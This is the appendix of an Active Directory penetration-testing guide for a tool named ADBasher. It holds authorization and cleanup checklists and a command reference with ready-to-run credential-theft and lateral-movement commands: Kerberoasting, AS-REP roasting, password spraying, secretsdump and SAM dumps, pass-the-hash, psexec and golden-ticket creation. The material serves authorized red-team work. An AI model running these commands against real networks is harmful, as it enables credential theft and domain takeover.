## 10. Appendices

### 10.1 Pre-Engagement Checklist

Complete this checklist before launching any AD penetration test to ensure proper authorization, scoping, and preparation.

#### Legal and Administrative

- [ ] **Signed Scope of Work (SOW)**
  - Engagement dates and duration
  - In-scope domains and IP ranges
  - Authorized testing methods
  - Deliverables and timeline
- [ ] **Rules of Engagement (ROE) Document**
  - Testing hours (business hours only? 24/7?)
  - Restricted actions (no DoS, no social engineering, etc.)
  - Out-of-scope systems explicitly listed
  - Data handling procedures
- [ ] **Authorization Letter**
  - Signed by legal authority (C-level or business owner)
  - Specifies authorized individuals conducting test
  - Includes emergency stop procedures
- [ ] **Non-Disclosure Agreement (NDA)**
  - Confidentiality of findings
  - Data retention and destruction policies
  - Client approval required for publication/case studies

#### Emergency Contacts

- [ ] **Client SOC/Security Team Contact**
  - Name: ******\_\_\_\_******
  - Phone: ******\_\_\_\_******
  - Email: ******\_\_\_\_******
- [ ] **Technical Point of Contact**
  - Name: ******\_\_\_\_******
  - Phone: ******\_\_\_\_******
  - Email: ******\_\_\_\_******
- [ ] **Management Escalation Contact**
  - Name: ******\_\_\_\_******
  - Phone: ******\_\_\_\_******
  - Email: ******\_\_\_\_******

#### Technical Preparation

- [ ] **Scope Verification**
  - [ ] Domain names documented: ******\_\_\_******
  - [ ] IP ranges documented: ******\_\_\_\_******
  - [ ] Exclusions documented: ******\_\_\_\_******
  - [ ] DNS resolution verified for target domains
- [ ] **Tool Installation and Verification**
  - [ ] ADBasher installed and tested
  - [ ] Python version: 3.10+ verified
  - [ ] Impacket scripts accessible (`which secretsdump.py`)
  - [ ] CrackMapExec installed (`crackmapexec --version`)
  - [ ] BloodHound installed and Neo4j running
  - [ ] All dependencies in `requirements.txt` installed
- [ ] **Configuration Review**
  - [ ] `core/config.yaml` reviewed
  - [ ] Target domains added to config
  - [ ] OPSEC mode set appropriately (standard/stealth/aggressive)
  - [ ] Session directory writable and has space (50GB+)
- [ ] **Wordlists and Resources Prepared**
  - [ ] Username list (from OSINT or provided by client)
  - [ ] Password spray wordlist (common passwords)
  - [ ] Rockyou.txt or custom wordlist for hash cracking
  - [ ] Backup of previous engagement data (if follow-up test)

#### Environment Setup

- [ ] **Network Connectivity**
  - [ ] VPN credentials received (if internal test)
  - [ ] VPN connection tested and stable
  - [ ] Route to target network verified (`ping <DC_IP>`)
  - [ ] DNS configured to use target DNS servers
  - [ ] NTP synchronized with target domain
- [ ] **Attack Platform Configuration**
  - [ ] Kali Linux / testing VM updated
  - [ ] Disk space verified (100GB+ free recommended)
  - [ ] RAM: 8GB+ available
  - [ ] Backup/snapshot created in case of system issues
- [ ] **Logging and Documentation**
  - [ ] Screen recording started (asciinema, OBS, etc.)
  - [ ] Note-taking application ready (CherryTree, Obsidian, etc.)
  - [ ] Screenshot tool configured (Flameshot, etc.)
  - [ ] Evidence collection directory created

#### Final Pre-Launch Checks

- [ ] **Re-read ROE Document**
  - Verify testing hours
  - Double-check exclusions
  - Confirm authorized methods
- [ ] **Communication Protocol Established**
  - Daily status updates agreed upon
  - Incident reporting procedure confirmed
  - Client notification plan for critical findings
- [ ] **ADBasher Dry-Run Complete**
  - Tested against lab environment
  - Config settings verified
  - Database logging confirmed functional
- [ ] **Go/No-Go Decision**
  - All checklist items complete: **GO**
  - Any items incomplete: **NO-GO** (resolve before proceeding)

**Engagement Start Time:** **\_\_\_\_** (Date/Time)  
**Tester Name:** ******\_\_\_\_******  
**Client Approval:** ******\_\_\_\_****** (Signature)

---

### 10.2 Post-Engagement Checklist

Complete this checklist before finalizing the engagement to ensure all persistence is removed and deliverables are complete.

#### Persistence Removal

- [ ] **Backdoor Accounts Deleted**

  - [ ] List all created accounts: ******\_\_\_\_******
  - [ ] Verify deletion for each account
  - [ ] Confirm accounts no longer in Active Directory

  ```bash
  # Verification command
  net user <account_name> /domain
  # Expected: "The user name could not be found."
  ```

- [ ] **Group Membership Changes Reverted**

  - [ ] List unauthorized group additions: ******\_\_\_\_******
  - [ ] Remove users from groups
  - [ ] Verify group membership restored to original state

  ```powershell
  # Verification
  Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name
  # Should not include any test accounts
  ```

- [ ] **ACL Modifications Reverted**

  - [ ] AdminSDHolder ACL reviewed and cleaned
  - [ ] GPO permissions restored
  - [ ] Computer/User object ACLs reverted

  ```powershell
  # Check AdminSDHolder
  Get-Acl "AD:\CN=AdminSDHolder,CN=System,DC=contoso,DC=local" |
    Select-Object -ExpandProperty Access
  ```

- [ ] **Golden/Silver Tickets Removed**

  - [ ] All .kirbi / .ccache files deleted from test system
  - [ ] KRBTGT password reset (coordinate with client)
  - [ ] Service account passwords reset (if compromised)

- [ ] **Scheduled Tasks / Services Removed**

  - [ ] Any persistence via scheduled tasks deleted
  - [ ] Unauthorized services removed
  - [ ] Verify via Event Logs (Event ID 4698 for tasks)

- [ ] **DCSync Rights Removed**

  - [ ] Revoked directory replication permissions
  - [ ] Verified only authorized accounts have DCSync rights

  ```powershell
  Get-DomainObjectAcl -SearchBase "DC=contoso,DC=local" |
    Where-Object {$_.ObjectAceType -match 'replication'}
  ```

- [ ] **Files and Tools Removed**
  - [ ] PowerShell scripts removed from compromised systems
  - [ ] Mimikatz / Rubeus binaries deleted
  - [ ] BloodHound collectors removed
  - [ ] Any uploaded executables deleted

#### Data Sanitization

- [ ] **Client Data Secured**
  - [ ] All collected data encrypted (AES-256)
  - [ ] Credentials stored in password manager (not plaintext)
  - [ ] Database backups encrypted
  - [ ] Screenshots redacted of PII/sensitive data
- [ ] **Retention Policy Applied**
  - [ ] Client data retention period documented: \_\_\_ days
  - [ ] Calendar reminder set for data deletion
  - [ ] Secure deletion method confirmed (shred, wipe)

#### Deliverables

- [ ] **Technical Report**
  - [ ] Executive summary (1-2 pages, non-technical)
  - [ ] Methodology section
  - [ ] All findings documented with:
    - [ ] Description
    - [ ] CVSS score
    - [ ] Evidence (screenshots, command output)
    - [ ] Remediation steps
    - [ ] Business impact
  - [ ] Attack path diagrams (BloodHound screenshots)
  - [ ] Remediation roadmap (prioritized)
- [ ] **Supporting Artifacts**

  - [ ] ADBasher session database (sanitized)
  - [ ] BloodHound data (ZIP files)
  - [ ] Log files (redacted of sensitive test data)
  - [ ] SIEM detection rules
  - [ ] IOC list (for defensive monitoring)

- [ ] **Remediation Guidance**
  - [ ] Immediate actions (week 1)
  - [ ] Short-term fixes (month 1)
  - [ ] Long-term improvements (quarter 1)
  - [ ] Monitoring recommendations
  - [ ] Compliance impact noted (GDPR, HIPAA, etc.)

#### Client Handoff

- [ ] **Debrief Meeting Scheduled**
  - [ ] Technical team walkthrough of findings
  - [ ] Executive presentation (if requested)
  - [ ] Q&A session
- [ ] **Report Delivery**
  - [ ] Encrypted PDF sent via secure channel
  - [ ] Supporting artifacts delivered (encrypted USB/secure upload)
  - [ ] Version control (v1.0, revisions as needed)
- [ ] **Remediation Support**
  - [ ] Offer to validate fixes (retest)
  - [ ] Provide contact for clarification questions
  - [ ] Define support period (e.g., 30 days post-delivery)

#### Internal Documentation

- [ ] **Lessons Learned Documented**
  - [ ] What worked well
  - [ ] What could be improved
  - [ ] New techniques discovered
  - [ ] Tool issues encountered
- [ ] **Time Tracking Finalized**
  - [ ] Hours per phase recorded
  - [ ] Budget vs actual analysis
  - [ ] Future estimate adjustments noted
- [ ] **Company Knowledge Base Updated**
  - [ ] New attack techniques added
  - [ ] Tool usage notes updated
  - [ ] Client-specific observations (for future engagements)

**Engagement End Time:** **\_\_\_\_** (Date/Time)  
**Cleanup Verified By:** ******\_\_\_\_******  
**Report Delivered:** **\_\_\_\_** (Date)  
**Client Acceptance:** ******\_\_\_\_****** (Signature/Email confirmation)

---

### 10.3 ADBasher Command Reference

Quick reference guide for common ADBasher commands and modules.

#### Core ADBasher Usage

**Basic Execution:**

```bash
# Single target domain
./adbasher.py --target contoso.local

# Multiple targets
./adbasher.py --target contoso.local corp.local 192.168.10.0/24

# Specify OPSEC mode
./adbasher.py --target contoso.local --opsec stealth

# Skip specific phases
./adbasher.py --target contoso.local --skip-phases persistence,lateral

# Resume existing session
./adbasher.py --session-id abc12345
```

**Configuration:**

```bash
# Edit global config
nano core/config.yaml

# Key settings:
# - evasion.mode: standard|stealth|aggressive
# - scope.target_domains: [list of domains]
# - global.log_level: INFO|DEBUG|WARNING
```

#### Phase 1: Reconnaissance

**DNS Discovery:**

```bash
python3 "1 nocreds/discover_domain.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local
```

**LDAP Anonymous Bind:**

```bash
python3 "1 nocreds/ldap_anonymous_bind.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target-ip 192.168.10.10
```

**SMB Null Enum:**

```bash
python3 "1 nocreds/smb_null_enum.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target-ip 192.168.10.10
```

**Network Scanning:**

```bash
python3 "1 nocreds/adnetscan_db.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target 192.168.10.0/24
```

#### Phase 2: Credential Attacks

**AS-REP Roasting (no creds required):**

```bash
python3 "3 nopass/automated/asreproast.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10
```

**Password Spraying:**

```bash
python3 "3 nopass/automated/password_spray.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10
```

**Kerberoasting (requires valid creds):**

```bash
python3 "3 nopass/automated/kerberoast.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10
```

#### Phase 3: Post-Exploitation

**Admin Privilege Check:**

```bash
python3 "6 validcreds/automated/check_admin.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10
```

**BloodHound Collection:**

```bash
python3 "6 validcreds/automated/bloodhound_collect.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10 \
  --username john.doe \
  --password Password123
```

**Secretsdump (requires admin):**

```bash
python3 "6 validcreds/automated/secretsdump_auto.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target-ip 192.168.10.10 \
  --domain contoso.local \
  --username administrator \
  --password Password123
```

**DCSync Check:**

```bash
python3 "6 validcreds/automated/dcsync_check.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10 \
  --username john.doe \
  --password Password123
```

#### Phase 4: Lateral Movement

**Multi-Method Lateral Movement:**

```bash
python3 "6 validcreds/automated/lateral_movement.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --method wmiexec

# Available methods: wmiexec, psexec, smbexec, atexec
```

#### Phase 5: Persistence

**Golden Ticket (from command line):**

```bash
# Note: ADBasher doesn't auto-create golden tickets
# Use Impacket ticketer.py manually:
ticketer.py -nthash [KRBTGT_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain contoso.local BackdoorAdmin
```

#### Database Queries

**Query Session Database:**

```bash
# Open database
sqlite3 ~/.adbasher/sessions/<SESSION_ID>/session.db

# View all targets
SELECT ip_address, hostname, is_dc FROM targets;

# View all credentials
SELECT username, password, is_admin FROM credentials WHERE is_valid = 1;

# View vulnerabilities
SELECT name, severity, description FROM vulnerabilities;

# Count findings
SELECT COUNT(*) FROM credentials WHERE is_admin = 1;
```

#### Manual Tool Integration

**CrackMapExec Integration:**

```bash
# Test credentials from database
crackmapexec smb 192.168.10.0/24 -u administrator -p Password123

# With NTLM hash (pth)
crackmapexec smb 192.168.10.0/24 -u administrator -H [NTLM_HASH] --local-auth

# Dump SAM
crackmapexec smb 192.168.10.50 -u administrator -p Password123 --sam

# Execute command
crackmapexec smb 192.168.10.50 -u administrator -p Password123 -x "whoami"
```

**Impacket Integration:**

```bash
# secretsdump
secretsdump.py contoso.local/administrator:Password123@192.168.10.10

# psexec
psexec.py contoso.local/administrator:Password123@192.168.10.50

# Get User SPNs (Kerberoast)
GetUserSPNs.py -request -dc-ip 192.168.10.10 contoso.local/user:pass

# Get NP Users (AS-REP Roast)
GetNPUsers.py -request -dc-ip 192.168.10.10 contoso.local/user:pass
```

#### Reporting

**Generate Reports:**

```bash
# Reports auto-generated at end of run
# Manual report generation:
python3 reporting/html_report.py --session-dir ~/.adbasher/sessions/<SESSION_ID>

# Reports saved to:
# ~/.adbasher/sessions/<SESSION_ID>/report.html
# ~/.adbasher/sessions/<SESSION_ID>/report.md
```

---

## Command Quick Reference Table

| Task                      | Command                                                       | Prerequisites  |
| ------------------------- | ------------------------------------------------------------- | -------------- |
| **Start full assessment** | `./adbasher.py --target domain.com`                           | None           |
| **Stealth mode**          | `./adbasher.py --target domain.com --opsec stealth`           | None           |
| **DNS discovery**         | `1 nocreds/discover_domain.py --domain domain.com`            | None           |
| **AS-REP Roast**          | `3 nopass/automated/asreproast.py --domain domain.com`        | None           |
| **Password spray**        | `3 nopass/automated/password_spray.py --domain domain.com`    | User list      |
| **Kerberoast**            | `3 nopass/automated/kerberoast.py --domain domain.com`        | Valid creds    |
| **BloodHound**            | `6 validcreds/automated/bloodhound_collect.py`                | Valid creds    |
| **Check admin**           | `6 validcreds/automated/check_admin.py`                       | Valid creds    |
| **Secretsdump**           | `6 validcreds/automated/secretsdump_auto.py`                  | Admin creds    |
| **Lateral movement**      | `6 validcreds/automated/lateral_movement.py --method wmiexec` | Admin creds    |
| **Query database**        | `sqlite3 ~/.adbasher/sessions/[ID]/session.db`                | Session exists |

---

This completes the comprehensive Active Directory Penetration Testing Guide for ADBasher. Use responsibly and always with proper authorization.
